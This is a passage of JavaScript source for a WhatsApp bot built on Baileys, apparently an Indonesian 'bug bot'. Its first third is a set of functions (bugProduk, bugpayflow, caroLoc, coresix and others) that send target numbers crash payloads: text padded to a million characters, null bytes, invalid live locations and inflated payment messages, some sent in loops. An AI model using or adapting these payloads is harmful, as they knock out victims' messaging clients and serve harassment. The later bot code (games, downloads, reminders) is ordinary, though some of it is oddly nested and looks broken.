              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: ryobug });
await ZetInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
    
async function killpic(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "RAPIKZ BOT BUG 🪲",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/9ce8eea4e4793c82eb5e1.jpg" } }, { upload: ZetInc.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #K-Bug Universe!!!"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await ZetInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
    
async function bugPayment(chats) {
await ZetInc.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: chats} })
} 

async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "⟠ 𝐙͢𝐱𝐕 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々"+"".repeat(920000),
        'footerText': `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
        'description': `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: ryobug });
await ZetInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function bugProduk(target, kuwoted) {
      var msg = generateWAMessageFromContent(target, proto.Message.fromObject({
        listMessage: {
          title: '𝖘𝖙𝖗𝖆𝖛𝖆𝕭𝖚𝖌' + "\0".repeat(999999),
          footerText: '.',
          description: '.',
          buttonText: null,
          listType: 2,
          productListInfo: {
            productSections: [{
              title: "anjay",
              products: [{
                productId: "4392524570816732"
              }]
            }],
            productListHeaderImage: {
              productId: "4392524570816732",
              jpegThumbnail: null
            },
            businessOwnerJid: '0@s.whatsapp.net'
          }
        },
        footer: 'puki',
        contextInfo: {
          expiration: 604800,
          ephemeralSettingTimestamp: "1679959486",
          entryPointConversionSource: "global_search_new_chat",
          entryPointConversionApp: "whatsapp",
          entryPointConversionDelaySeconds: 9,
          disappearingMode: {
            initiator: "INITIATED_BY_ME"
          }
        },
        selectListType: 2,
        product_header_info: {
          product_header_info_id: 292928282928,
          product_header_is_rejected: true
        }
      }), {userJid: target, quoted: kuwoted});
      await ZetInc.relayMessage(target, msg.message, { participant: { jid: target }, messageId: msg.key.id});
}

    async function bugpayflow(userJidx) {
            for (let i = 0; i < 20; i++) {
              const qpaybutton = {
                name: "payment_info",
                buttonParamsJson: JSON.stringify({
                  currency: "MYR",
                  total_amount: {
                  value: 999999999999,
                  offset: 999999999999
                  },
                  reference_id: "X0D3SK9ZD3V",
                  type: "physical-goods",
                  order: {
                    status: 'pending',
                    subtotal: {
                    value: 999999999999,
                    offset: 999999999999
                    },
                    order_type: 'ORDER',
                    items: [{
                      name: "📄 SCRIPT BUG VIRDARK . X ONE MYR.𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦",
                      amount: {
                      value: 999999999999,
                      offset: 999999999999
                      },
                      quantity: 999999999999,
                      sale_amount: {
                      value: 999999999999,
                      offset: 999999999999
                      },
                    }]
                  },
                  payment_settings: [{
                    type: "pix_static_code",
                    pix_static_code: {
                      merchant_name: "SkyzDeveloper",
                      key: "WDX",
                      key_type: 'Q'
                    }
                  }]
                })
              };
              const nativeFlowMessage = {
                buttons: [qpaybutton]
              };
              const interactiveMessage = {
                nativeFlowMessage: nativeFlowMessage
              };
              const message = {
                messageContextInfo: {
                deviceListMetadataVersion: 2,
                deviceListMetadata: {}
                },
                interactiveMessage: interactiveMessage
              };
              const viewOnceMessage = {
                message: message
              };
              const vrdrk = {
                viewOnceMessage: viewOnceMessage
              };
              await ZetInc.relayMessage(userJidx, vrdrk, {
                participant: {
                  jid: userJidx
                }
              });
            }
            for (let j = 0; j < 3; j++) {
              const header = {
                title: '',
                subtitle: " "
              };
              const body = {
                text: "📄 SCRIPT BUG VIRDARK . CRASH ‍📄.SKYZCRASHED . ‍📄.SKYZCRASHED . ‍📄.SKYZCRASHED .𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦"
              };
              const footer = {
                'text': "📄 SCRIPT BUG VIRDARK . CRASH ؂؃؂؃.؂؃؂؃.؂؃؂؃"
              };
              const displaybuttons = {
                name: "cta_url",
                buttonParamsJson : JSON.stringify({
                  display_text: "C҉R҉A҉S҉H҉ W҉H҉A҉T҉S҉A҉P҉P҉꙰꙰",
                  url: '',
                  merchant_url: ''
                })
              };
              const vrdrknew = {
                viewOnceMessage: {
                  message: {
                    interactiveMessage: {
                      header: header,
                      body: body,
                      footer: footer,
                      nativeFlowMessage: {
                        buttons: [displaybuttons],
                        messageParamsJson: ".𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦".repeat(100000)
                      }}}}};
              await ZetInc.relayMessage(userJidx, vrdrknew, { participant: { jid: userJidx
                }})}}

  async function sendLiveLocationMessage2(target, kuoted) {
    var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          liveLocationMessage: {
            degreesLatitude: "p",
            degreesLongitude: "p",
            caption: "K-Tech" + ".𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦".repeat(50000),
            sequenceNumber: "0",
            jpegThumbnail: ""
          }
        }
      }
    }), {
      userJid: target,
      quoted: kuoted
    });
    await ZetInc.relayMessage(target, etc.message, {
      participant: {
        jid: target
      },
      messageId: etc.key.id
    });
  }
    
async function coresix(target, text, amount, ptcp = false) {
    await ZetInc.relayMessage(target, 
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: text,
                            format: "EXTENSIONS_1"
                        },
                        nativeFlowResponseMessage: {
                            name: 'galaxy_message',
                            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(amount)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                            version: 3
                        }
                    }
                }
            }
        }, 
        ptcp ? { participant: { jid: target } } : {}
    );
};
    
async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg" } }, { upload: ZetInc.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #ryozingoddominate"
      },
      nativeFlowMessage: {
        messageParamsJson: "".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await ZetInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
    
async function aipong(target) {
await ZetInc.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
} 


async function caroLoc(target, kuoted) {
    var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          liveLocationMessage: {
            degreesLatitude: "-999999999999999999999999999",
            degreesLongitude: "-999999999999999999999999999",
            caption: "‌𝐙‌𝐄‌𝐓‌‌ॎ𝐄𝐗‌𝐄𝐂‌‌𝐔𝐓‌𝐈𝐎𝐍‌" + ".𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦".repeat(750000),
            sequenceNumber: "0",
            jpegThumbnail: ""
          }
        },
         carouselMessage: "{}"
      }
    }), {
      userJid: target,
      quoted: kuoted
    });
    await ZetInc.relayMessage(target, etc.message, {
      participant: {
        jid: target
      },
      messageId: etc.key.id
    });
}
    
async function BugPayment(jid){
await ZetInc.relayMessage(jid, { viewOnceMessage: { message: { messageContextInfo: { deviceListMetadataVersion: 2, deviceListMetadata: {}}, interactiveMessage: {
nativeFlowMessage: {
buttons: [
{
name: 'payment_info',
buttonParamsJson: '{"currency":"INR","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"meu ovo","key":"+916909137213","key_type":"X"}}]}',
},
],
}}}}}, { participant: { jid: jid } }, { messageId: null })}

async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await ZetInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
  
ZetInc.editmsg = async (e, t) => {
var a = [`${e}.`, `${e}..`, `${e}...`, `${e}.....`, `${t}`];
let { key: s } = await ZetInc.sendMessage(m.chat, {text: e});
for (let r = 0; r < a.length; r++) await ZetInc.sendMessage(m.chat, {text: a[r], edit: s
})
}

try{
const isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isCreator ? 1000 : limitawal
let balanceUser = isCreator ? 10000 : balanceawal
let user = global.db.data.users[sender]
if (typeof user !== 'object') global.db.data.users[sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('badword' in user)) user.badword = 0
if (!('title' in user)) user.title = ''
if (!('serialNumber' in user)) user.serialNumber = randomBytes(16).toString('hex') 
if (!('afkReason' in user)) user.afkReason = ''
if (!('nick' in user)) user.nick = ZetInc.getName(sender)
if (!('autolevelup' in user)) user.autolevelup = true
if (!isPremium) user.premium = false
if (!('totalLimit' in user)) user.totalLimit = 0
if (!isNumber(user.balance)) user.balance = 10000
if (!isNumber(user.limit)) user.limit = limitUser
if (!isNumber(user.level)) user.level = 0
if (!isNumber(user.lastgift)) user.lastgift = 86400000
if (!isNumber(user.snlast)) user.snlast = 0
if (!isNumber(user.warn)) user.warn = 0
if (!isNumber(user.unreglast)) user.unreglast = 0
if (!('registered' in user)) user.registered = false
if (!user.registered) {
if (!('email' in user)) user.email = ''
if (!isNumber(user.codeExpire)) user.codeExpire = 0
}
} else global.db.data.users[sender] = {
serialNumber: randomBytes(16).toString('hex'),
title: `${isPremium ? 'Premium' : 'User'}`,
afkTime: -1,
badword: 0,
afkReason: '',
snlast: 0,
warn: 0,
email: '',
lastgift: 86400000,
autolevelup: true,
nick: m.sender,
premium: `${isPremium ? 'true' : 'false'}`,
limit: limitUser,
balance: balanceUser,
level: 0,
totalLimit: 0
}
    
let chats = global.db.data.chats[m?.chat]
if (typeof chats !== 'object') global.db.data.chats[m?.chat] = {}
if (chats) {
if (!('badword' in chats)) chats.badword = false
if (!('antiforeignnum' in chats)) chats.antiforeignnum = false
if (!('antibot' in chats)) chats.antibot = false
if (!('antiviewonce' in chats)) chats.antiviewonce = false
if (!('antimedia' in chats)) chats.media = false
if (!('antivirtex' in chats)) chats.antivirtex = false
if (!('antiimage' in chats)) chats.antiimage = false
if (!('antivideo' in chats)) chats.video = false
if (!('antiNsfw' in chats)) chats.antiNsfw = false
if (!('antiaudio' in chats)) chats.antiaudio = false
if (!('isBanned' in chats)) chats.isBanned = false
if (!('ai' in chats)) chats.chatbot = true
if (!('antipoll' in chats)) chats.antipoll = false
if (!('antisticker' in chats)) chats.antisticker = false
if (!('anticontact' in chats)) chats.anticontact = false
if (!('antilocation' in chats)) chats.antilocation = false
if (!('antidocument' in chats)) chats.antidocument = false
if (!('antilink' in chats)) chats.antilink = false
if (!('antiToxic' in chats)) chats.antiToxic = false
if (!('antilinkgc' in chats)) chats.antilinkgc = false
if (!('simi' in chats)) chats.chatbot = true
}
else global.db.data.chats[m.chat] = {
simi: true,
ai: false,
badword: false,
antiforeignnum: false,
antibot: false,
antiviewonce: false,
antivirtex: false,
antimedia: false,
antiNsfw: false,
antiimage: false,
isBanned: false,
antivideo: false,
antiaudio: false,
antipoll: false,
antisticker: false,
antilocation: false,
antidocument: false,
anticontact: false,
antilink: false,
antiToxic: false,
antilinkgc: false
}
    
let settings = global.db.data.settings
if (settings) {
if (!('autobio' in settings)) settings.autobio = false
if (!('autoread' in settings)) settings.autoread = false
if (!('game' in settings)) settings.game = false
if (!isNumber(settings.hitstat)) settings.hitstat = 0
if (!("welcome" in settings)) settings.welcome = true;
if (!("levelup" in settings)) settings.levelup = true;
if (!('textJpm' in settings)) settings.textJpm = ''
if (!('registrasi' in settings)) settings.registrasi = {}
if (!('spotifyPlay' in settings)) settings.spotifyPlay = {}
if (!('ytPlay' in settings)) settings.ytPlay = {}
if (!('cai' in settings)) settings.cai = {}
} else global.db.data.settings = {
autobio: false,
autoread: false,
game: false,
hitstat: 0,
welcome: true,
levelup: true,
textJpm: '',
registrasi: {},
spotifyPlay: {},
ytPlay: {},
cai: {}
} 
} catch (err) {
console.log(err)
}


if ((m?.chat in global.db.data.chats || m?.sender in global.db.data.users)) {
let chat = global.db.data.chats[m?.chat]
if (chat && chat.isBanned && !isCreator) return
}

let limitnya = global.db.data.users[sender].limit
let balancenya = global.db.data.users[sender].balance

async function uselimit() {
if (isCreator) return
global.db.data.users[m?.sender].limit -= 1
}

async function replyp(text) {
ZetInc.sendMessage(m.chat, {
contextInfo: {
mentionedJid: await ments(text),
externalAdReply: {
showAdAttribution: false,
renderLargerThumbnail: false,
title: `© ${global.botname} Project v2`,
body: `${pushname} 👋`,
previewType: "VIDEO",
thumbnail: menunya,
sourceUrl: `https://kyuurzy.site`,
mediaUrl: `https://kyuurzy.site`
}
},
text: text
}, {
quoted: qevent
})}
    
async function newReply(wow) {
if (typereply === "v1") {
ZetInc.sendMessage(m.chat, {
document: fs.readFileSync("./package.json"),
fileName: "𝗞𝘆𝘂𝘂𝗥𝘇𝘆 - 𝗔𝘀𝘀𝗶𝘀𝘁𝗮𝗻𝘁",
mimetype: "application/pdf",
fileLength: 99999,
pageCount: 666,
caption: wow,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: "KyuuRzy - Assistant",
newsletterJid: `${global.idch}`,
},
externalAdReply: {  
title: global.foother, 
body: global.bodyfooter,
thumbnailUrl: `${global.thumbnail}`,
sourceUrl: global.url, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
} if (typereply === "v2") {
ZetInc.sendMessage(m.chat, {
text: wow,
contextInfo: {
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: "© KyuuSenpaiii - Gen 7x",
newsletterJid: `${global.idch}`,
},
isForwarded: true,
externalAdReply: {
title: `© Simple Bot - KyuuRzy Universe!!!`,
body: `By KyuuSenpaiii - Gen 7x`,
thumbnailUrl: `${global.thumbnail}`,
sourceUrl: `https://kyuurzy.tech`,
mediaType: 1,
showAdtibution: true,
renderLargerThumbnail: true
}}}, {quoted:m})
} if (typereply === "v3") {
const baten = new Button()
let ads = baten.setBody(wow);
ads += baten.setImage(thumbnail);
ads += baten.addUrl("KyuuRzy Tech", `kyuurzy.tech`);
ads += baten.run(m.chat, ZetInc, m);
}} 
    
const { mp3, mp4 } = require("node-yt-dl")
async function downloadMp3(link) {
try {
const { media, title } = await mp3(link)
ZetInc.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let lagu = { audio: { url:media},
mimetype: "audio/mpeg",
fileName: title + ".mp3",
contextInfo: {
forwardingScore: 100,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: `${global.idch}`,
serverMessageId: null,
newsletterNe: `${global.bodyfooter}`
},
externalAdReply: {
showAdAttribution: true,
title: title,
sourceUrl: link,
thumbnailUrl: thumbnail
}}}
await ZetInc.sendMessage(m.chat, lagu,{ quoted:m})
}catch (err) {
zreply(`${err}`)
}
}

async function downloadMp4(link) {
try {
const { media, title } = await mp4(link)
ZetInc.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let video = {
video: { url: media },
mimetype: "video/mp4",
fileName: title + ".mp4",
contextInfo: {
forwardingScore: 100,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: `${global.idch}`,
serverMessageId: null,
newsletterNe: `${global.bodyfooter}`
},
externalAdReply: {
showAdAttribution: true,
title: title,
sourceUrl: link,
thumbnailUrl: thumbnail
}
}
}
await ZetInc.sendMessage(m.chat, video, { quoted: m })
} catch (err) {
zreply(`${err}`)
}
}

const totalFitur = () => {
var mytext = fs.readFileSync("./message.js").toString();
var numUpper = (mytext.match(/case '/g) || []).length;
return numUpper;
};

if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in db.data.sticker)) {
let hash = db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
userJid: ZetInc.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, ZetInc.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
ZetInc.ev.emit('messages.upsert', msg)
}
    
ZetInc.autoshalat = ZetInc.autoshalat ? ZetInc.autoshalat : {};
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? ZetInc.user.id : m.sender;
let id = m.chat;
if (id in ZetInc.autoshalat) {
return false;
}
let jadwalSholat = {
shubuh: "04:29",
terbit: "05:44",
dhuha: "06:02",
dzuhur: "12:02",
ashar: "15:15",
magrib: "17:52",
isya: "19:01",
};
const datek = new Date(
new Date().toLocaleString("en-US", {
timeZone: "Asia/Jakarta",}),
);
const hours = datek.getHours();
const minutes = datek.getMinutes();
const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`;
for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
if (timeNow === waktu) {
let caption = `Hai kak ${pushname},\nWaktu *${sholat}* telah tiba, ambilah air wudhu dan segeralah shalat🙂.\n\n*${waktu}*\n_untuk wilayah Makassar dan sekitarnya._`;
ZetInc.autoshalat[id] = [
zreply(caption),
setTimeout(async () => {
delete ZetInc.autoshalat[m.chat];
}, 57000),];
}}  

if ((budy) && ["apatuh"].includes(budy) && !isCmd) {
if (m.quoted.mtype !== "viewOnceMessageV2") return
if (!isCreator) return
let msg = m.quoted.message;
let type = Object.keys(msg)[0];
let media = await downloadContentFromMessage(
msg[type],
type == "imageMessage" ? "image" : "video",
);
let buffer = Buffer.from([]);
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk]);
}
if (/video/.test(type)) {
return ZetInc.sendFile(
m.chat,
buffer,
"media.mp4",
msg[type].caption || "",
m,
);
} else if (/image/.test(type)) {
return ZetInc.sendFile(
m.chat,
buffer,
"media.jpg",
msg[type].caption || "",
m,
);
}
}

async function dellCase(filePath, caseNameToRemove) {
fs.readFile(filePath, 'utf8', (err, data) => {
if (err) {
console.error('Terjadi kesalahan:', err);
return;
}

if (chat.antiBot) {
let chat = global.db.data.chats[m.chat];
if (m.formMe) return
if (m.isBaileys == true) {
ZetInc.sendMessage(m.chat, {
text: `Bot Terdeteksi!`,
}, { quoted: m });
ZetInc.groupParticipantsUpdate(m.chat, [m.sender], "remove");
}
}
    
const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
const modifiedData = data.replace(regex, '');
fs.writeFile(filePath, modifiedData, 'utf8', (err) => {
if (err) {
console.error('Terjadi kesalahan saat menulis file:', err);
return;
}
console.log(`Teks dari case '${caseNameToRemove}' telah dihapus dari file.`);
});
});
}
    
var randomColor = ['#232023'];
const apiColor = randomColor[Math.floor(Math.random() * randomColor.length)];
  
async function Quotly(obj) {
let json;

try {
json = await axios.post("https://quote-api.rippanteq7.repl.co/generate", obj, {
headers: {
"Content-Type": "application/json"
}
});
} catch (e) {
try {
json = await axios.post("https://quote-api-1.jigarvarma2005.repl.co/generate", obj, {
headers: {
"Content-Type": "application/json"
}
});
} catch (e) {
try {
json = await axios.post("https://qc-api.rizzlogy.repl.co/generate", obj, {
headers: {
"Content-Type": "application/json"
}
});
} catch (e) {
try {
json = await axios.post("https://quote-api.ghost19ui.repl.co/generate", obj, {
headers: {
"Content-Type": "application/json"
}
});
} catch (e) {
return e;
}
}
}
}

    
const cron = require('node-cron');
cron.schedule('00 00 * * *', () => {
let user = Object.keys(global.db.data.users)
for (let jid of user) {
global.db.data.users[jid].claim = 1
if (global.db.data.users[jid].balance < 10000 && global.db.data.users[jid].limit < 1) {
global.db.data.users[jid].limit = limitawal
global.db.data.users[jid].balance = balanceawal
}}}, {
scheduled: true,
timezone: "Asia/Makassar"
})
   
cron.schedule('*/20 * * * *', () => {
fs.readdir("./session", async function(err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return reply('Unable to scan directory: ' + err);
}
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
)
console.log(filteredArray.length);
/*let teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`
if (filteredArray.length == 0) return reply(teks)
filteredArray.map(function(e, i) {
teks += (i + 1) + `. ${e}\n`
})
reply(teks)
await sleep(2000)*/
await filteredArray.forEach(function(file) {
fs.unlinkSync(`./session/${file}`)
});
await sleep(2000)
ZetInc.sendMessage(`${global.owner}`, {text : `Berhasil Menghapus Sampah Di Folder Session Secara Otomatis.`})
})})
         
const results = json.data.result.image;
const buffer = Buffer.from(results, "base64");
return buffer;
}    
    
async function makeSticker(media,Sticker, StickerTypes){
let jancok = new Sticker(media, {
pack: global.packname, // The pack name
author: m.pushname, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await ZetInc.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${botname}`, mediaType: 3,renderLargerThumbnail : true,thumbnailUrl:`https://telegra.ph/file/7e03b6846ec421b9d8fba.jpg`,sourceUrl: `https://kyuurzy.site`
}}, sticker: nah }, { quoted: m })
await fs.unlinkSync(stok)
}

   
const isTicTacToe = (from, _dir) => {
let status = false
Object.keys(_dir).forEach((i) => {
if (_dir[i].id === from) {
status = true
}
})
return status
}

const getPosTic = (from, _dir) => {
let position = null
Object.keys(_dir).forEach((i) => {
if (_dir[i].id === from) {
position = i
}
})
if (position !== null) {
return position
}
}

const KeisiSemua = (tic) => {
let status = true
for (let i of tic){
if (i !== '❌' && i !== '⭕'){
status = false
}
}
return status
}

const cekIsi = (nomor, tic) => {
let status = false
if (tic[nomor] === '❌' || tic[nomor] === '⭕'){
status = true
}
return status
}

const cekTicTac = (tic) => {
let status = false
if (tic[0] === '❌' && tic[1] === '❌' && tic[2] === '❌' || tic[0] === '⭕' && tic[1]=== '⭕' && tic[2] === '⭕'){
status = true
} else if (tic[3] === '❌' && tic[4] === '❌' && tic[5] === '❌' || tic[3] === '⭕' && tic[4] === '⭕' && tic[5] === '⭕'){
status = true
} else if (tic[6] === '❌' && tic[7] === '❌' && tic[8] === '❌' || tic[6] === '⭕' && tic[7] === '⭕' && tic[8] === '⭕'){
status = true
} else if (tic[0] === '❌' && tic[3] === '❌' && tic[6] === '❌' || tic[0] === '⭕' && tic[3] === '⭕' && tic[6] === '⭕'){
status = true
} else if (tic[1] === '❌' && tic[4] === '❌' && tic[7] === '❌' || tic[1] === '⭕' && tic[4] === '⭕' && tic[7] === '⭕'){
status = true
} else if (tic[2] === '❌' && tic[5] === '❌' && tic[8] === '❌' || tic[2] === '⭕' && tic[5] === '⭕' && tic[8] === '⭕'){
status = true
} else if (tic[0] === '❌' && tic[4] === '❌' && tic[8] === '❌' || tic[0] === '⭕' && tic[4] === '⭕' && tic[8] === '⭕'){
status = true
} else if (tic[2] === '❌' && tic[4] === '❌' && tic[6] === '❌' || tic[2] === '⭕' && tic[4] === '⭕' && tic[6] === '⭕'){
status = true
}
return status 
}

if (isTicTacToe(from, tictactoe)) {
try {
// TicTacToe
if (isTicTacToe(from, tictactoe)){
let nomor = [1, 2, 3, 4, 5, 6, 7, 8, 9]
let posi = tictactoe[from]
let anu = posi.TicTacToe
if (posi.status === null){
if (sender === posi.ditantang){
if (body.toLowerCase() === 'y'){
the = `@${posi.ditantang.split('@')[0]} menerima tantangan

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Giliran @${posi.penantang.split('@')[0]}`
ZetInc.sendtext(from, the, m)

tictactoe[from].status = true
} else if (body.toLowerCase() === 'n'){
users[m.sender].balance -= 1000
the1 = `@${posi.ditantang.split('@')[0]} menolak, game dibatalkan\nDan Player dikenakan sanksi -1000 balance karna menolak ajakan pemain`
ZetInc.sendtext(from, the1, m)
delete tictactoe[from];
}
}
} else if (posi.status === true){
if (sender === posi.penantang){
for (let i of nomor){
if (Number(body) === i){
if (cekIsi(Number(body) - 1, anu)) return zreply(`Nomor tersebut sudah terisi`)
tictactoe[from].TicTacToe[Number(body) - 1] = '❌'
if (cekTicTac(tictactoe[from].TicTacToe)){
the2 = `@${posi.penantang.split('@')[0]} Menang

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

